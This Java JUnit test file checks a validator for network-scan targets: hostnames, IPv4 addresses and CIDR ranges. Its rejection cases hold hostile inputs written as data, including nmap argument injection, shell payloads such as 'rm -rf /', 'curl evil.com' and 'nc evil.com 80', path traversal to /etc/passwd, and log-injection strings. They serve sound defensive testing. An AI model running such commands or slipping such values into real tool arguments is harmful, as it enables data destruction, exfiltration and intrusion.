package com.cyberscope.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

class TargetValidatorTest {

    @Nested
    @DisplayName("accepts legitimate targets")
    class ValidTargets {

        @ParameterizedTest(name = "{0} -> {1}")
        @CsvSource({
                "127.0.0.1,        127.0.0.1",
                "0.0.0.0,          0.0.0.0",
                "255.255.255.255,  255.255.255.255",
                "192.168.1.1,      192.168.1.1",
                "8.8.8.8,          8.8.8.8",
                "localhost,        localhost",
                "scanme.nmap.org,  scanme.nmap.org",
                "my-host.local,    my-host.local",
                "host1.example.com, host1.example.com",
                "a.b,              a.b"
        })
        void acceptsAndNormalises(String input, String expected) throws Exception {
            assertEquals(expected, TargetValidator.validate(input).value());
        }

        @Test
        @DisplayName("trims surrounding whitespace")
        void trimsWhitespace() throws Exception {
            assertEquals("10.0.0.1", TargetValidator.validate("  10.0.0.1  ").value());
        }

        @Test
        @DisplayName("lowercases hostnames, since DNS is case-insensitive")
        void lowercasesHostnames() throws Exception {
            assertEquals("scanme.nmap.org", TargetValidator.validate("SCANME.NMAP.ORG").value());
        }

        @Test
        @DisplayName("strips the trailing root dot of a fully qualified name")
        void stripsTrailingDot() throws Exception {
            assertEquals("example.com", TargetValidator.validate("example.com.").value());
        }

        @Test
        @DisplayName("accepts a label of exactly 63 characters")
        void acceptsMaximumLabel() throws Exception {
            String host = "x".repeat(63) + ".com";
            assertEquals(host, TargetValidator.validate(host).value());
        }
    }

    @Nested
    @DisplayName("rejects argument injection")
    class ArgumentInjection {

        @ParameterizedTest
        @ValueSource(strings = {
                "-oA /etc/cron.d/pwn",
                "-iL /etc/passwd",
                "--script=http-vuln-cve2017-5638",
                "--interactive",
                "-sS",
                "--datadir=/tmp/evil",
                "-host.com"
        })
        void rejectsAnythingStartingWithHyphen(String input) {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate(input));
            assertTrue(e.getMessage().contains("must not begin with '-'"),
                    "expected the hyphen guard to fire, got: " + e.getMessage());
        }
    }

    @Nested
    @DisplayName("rejects shell metacharacters")
    class ShellMetacharacters {

        @ParameterizedTest
        @ValueSource(strings = {
                "1.1.1.1; rm -rf /",
                "1.1.1.1 && curl evil.com",
                "$(whoami)",
                "`id`",
                "1.1.1.1|nc evil.com 80"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }
    }

    @Nested
    @DisplayName("rejects alternate IP notations")
    class IpNotationBypasses {

        @ParameterizedTest
        @ValueSource(strings = {
                "010.1.1.1",
                "0177.0.0.1",
                "2130706433",
                "127.1",
                "0x7f.0.0.1",
                "256.1.1.1",
                "999.999.999.999",
                "1.2.3",
                "1.2.3.4.5",
                "192.168.1.1%eth0"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }
    }

    @Nested
    @DisplayName("rejects multi-target and log-injection payloads")
    class Injection {

        @ParameterizedTest
        @ValueSource(strings = {
                "1.1.1.1\n2.2.2.2",
                "1.1.1.1\r\nFAKE LOG ENTRY",
                "1.1.1.1\t2.2.2.2",
                "1.1.1.1 2.2.2.2"
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }

        @Test
        @DisplayName("neutralises control characters when echoing input in the message")
        void sanitisesControlCharsInMessage() {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("1.1.1.1\r\nFAKE"));
            assertFalse(e.getMessage().contains("\n"), "message must not contain a newline");
            assertFalse(e.getMessage().contains("\r"), "message must not contain a return");
        }
    }

    @Nested
    @DisplayName("rejects malformed input")
    class MalformedInput {

        @ParameterizedTest
        @NullSource
        @ValueSource(strings = {
                "", "   ", ".", "a..b", "host-.com", "../../etc/passwd",
                "host_name.com",
                "exаmple.com",   // Cyrillic 'a' - homograph
                "café.com"       // non-ASCII
        })
        void rejects(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }

        @Test
        @DisplayName("rejects a label longer than 63 characters")
        void rejectsOversizedLabel() {
            assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("x".repeat(64) + ".com"));
        }

        @Test
        @DisplayName("rejects a name longer than 253 characters")
        void rejectsOversizedName() {
            assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("a.".repeat(200) + "com"));
        }
    }

    @Nested
    @DisplayName("resists denial of service")
    class Performance {

        @Test
        @DisplayName("does not backtrack catastrophically on pathological input")
        void noCatastrophicBacktracking() {
            String pathological = "a".repeat(60) + "-".repeat(60) + "!";
            long start = System.nanoTime();
            for (int i = 0; i < 2000; i++) {
                assertThrows(InvalidTargetException.class,
                        () -> TargetValidator.validate(pathological));
            }
            long millis = (System.nanoTime() - start) / 1_000_000;
            assertTrue(millis < 2000, "2000 validations took " + millis + "ms");
        }
    }
        @Nested
    @DisplayName("CIDR ranges")
    class CidrRanges {

        @ParameterizedTest(name = "{0} -> {1} ({2} addresses)")
        @CsvSource({
                "192.168.1.0/24,  192.168.1.0/24,  256",
                "192.168.1.57/24, 192.168.1.0/24,  256",
                "10.0.0.0/25,     10.0.0.0/25,     128",
                "10.0.0.200/28,   10.0.0.192/28,   16",
                "172.20.64.1/30,  172.20.64.0/30,  4",
                "127.0.0.1/32,    127.0.0.1/32,    1"
        })
        @DisplayName("accepts a range and normalises it to the network address")
        void acceptsAndNormalisesRanges(String input, String expected, int count)
                throws Exception {
            ValidatedTarget target = TargetValidator.validate(input);
            assertEquals(expected, target.value());
            assertEquals(TargetKind.CIDR, target.kind());
            assertEquals(count, target.addressCount());
            assertTrue(target.isRange());
        }

        @ParameterizedTest
        @ValueSource(strings = {"192.168.0.0/16", "10.0.0.0/8", "0.0.0.0/0", "192.168.1.0/23"})
        @DisplayName("refuses a range larger than /24 so a mistyped prefix cannot run away")
        void refusesOversizedRanges(String input) {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate(input));
            assertTrue(e.getMessage().contains("accepts at most"), e.getMessage());
        }

        @Test
        @DisplayName("reports the true address count for /0 rather than overflowing an int")
        void reportsCorrectCountForSlashZero() {
            InvalidTargetException e = assertThrows(InvalidTargetException.class,
                    () -> TargetValidator.validate("0.0.0.0/0"));
            assertTrue(e.getMessage().contains("4294967296"),
                    "1 << 32 wraps to 1 on an int; the count must use long arithmetic: "
                    + e.getMessage());
        }

        @ParameterizedTest
        @ValueSource(strings = {"192.168.1.0/33", "192.168.1.0/99", "192.168.1.0/024",
                                "256.1.1.0/24", "192.168.1.0/", "192.168.1.0/-1",
                                "192.168.1.0/24/25"})
        @DisplayName("rejects malformed ranges")
        void rejectsMalformedRanges(String input) {
            assertThrows(InvalidTargetException.class, () -> TargetValidator.validate(input));
        }

        @Test
        @DisplayName("a single host is not a range")
        void singleHostIsNotARange() throws Exception {
            ValidatedTarget t = TargetValidator.validate("127.0.0.1");
            assertFalse(t.isRange());
            assertEquals(1, t.addressCount());
            assertEquals(TargetKind.IPV4, t.kind());
            assertEquals("127.0.0.1", t.describe());
        }

        @Test
        @DisplayName("describe() pluralises correctly")
        void describePluralises() throws Exception {
            assertEquals("127.0.0.1/32 (1 address)",
                    TargetValidator.validate("127.0.0.1/32").describe());
            assertEquals("10.0.0.0/25 (128 addresses)",
                    TargetValidator.validate("10.0.0.0/25").describe());
        }
    }
}
